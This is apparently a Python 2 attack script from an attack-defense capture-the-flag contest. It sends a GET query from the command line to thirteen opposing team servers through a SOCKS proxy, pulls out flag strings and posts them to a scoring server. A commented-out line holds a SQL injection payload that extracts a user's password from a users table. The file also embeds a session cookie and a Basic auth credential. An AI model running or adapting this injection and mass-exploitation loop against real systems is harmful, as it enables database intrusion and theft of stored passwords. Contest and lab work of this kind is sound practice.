#!/usr/bin/env python
import urllib2
import re
import json
import sys
import socks
import socket


socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "localhost", 8080)
socket.socket = socks.socksocket

ipArray=['http://10.41.1.2','http://10.41.2.2', 'http://10.41.3.2', 'http://10.41.4.2', 'http://10.41.5.2', 'http://10.41.6.2', 'http://10.41.7.2', 'http://10.41.8.2', 'http://10.41.9.2', 'http://10.41.10.2', 'http://10.41.12.2', 'http://10.41.13.2', 'http://10.41.14.2']
if len(sys.argv) > 1:
        get_query = sys.argv[1]

#get_query= ':4321/showpaper.php?paper_id=1%27%20UNION%20SELECT%20password,%20null,%20null,%20null,%20null,%20null,%20null,%20null%20from%20users%20where%20user_id%20=%271%27%20--%20a'
post_url = "http://10.90.90.55:4567/flag"

headers = {'User-agent' : 'Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)', 'Referer' : 'http://10.90.90.55:4567/', 'Cookie': "rack.session=BAh7CUkiD3Nlc3Npb25faWQGOgZFRiJFMTg3OTM0YjQ1MmU1YzMwZTYzZGYw%0AZTQwZDg4NzJjYjNlYTZhYWE4YjY1NzJkMGM3MGI3MDYzNDg4ZmVlY2M1Ykki%0ACWNzcmYGOwBGIiVmOWYxZTAyNjY3YzQwZDQ4MzcxNTVkZTBkMWJkMGFlZEki%0ADXRyYWNraW5nBjsARnsHSSIUSFRUUF9VU0VSX0FHRU5UBjsARiItNjdiNDEz%0AMmVmMTFjOTI1YTJiNGNlMTM3YjJmMmZiMDMzYTg1MWNiZEkiGUhUVFBfQUND%0ARVBUX0xBTkdVQUdFBjsARiItZGQwNjVlZDI2M2M2N2Q3OTlmOTQzYWI2YzM5%0AYjU1YzVlMDA4Y2JiNUkiDHRlYW1faWQGOwBGaRA%3D%0A--d041cffdeafe36a84c1029aeab793571d68dd3a4", "Authorization":"Basic MTE6ZWl6SXNQUTcwbA=="}

for i in ipArray:
     try:
        getReqUrl=i+get_query
        response=urllib2.urlopen(getReqUrl, timeout=5)
        resPage=response.read()
        text = resPage.decode()
        #print resPage
        grabTheFlag = re.findall(r'FLG\w+', text)
        if len(grabTheFlag)>0:
                print str(grabTheFlag[0])
                try:
                        data = {"flag":str(grabTheFlag[0])}
                        req = urllib2.Request(post_url,json.dumps(data), headers)
                        response= urllib2.urlopen(req, timeout=5)
                        postResp=response.read()
                        print postResp
                except IOError:
                        print "IO Error"
        else:
                print "No Flag"
     except IOError:
        print "IO Error"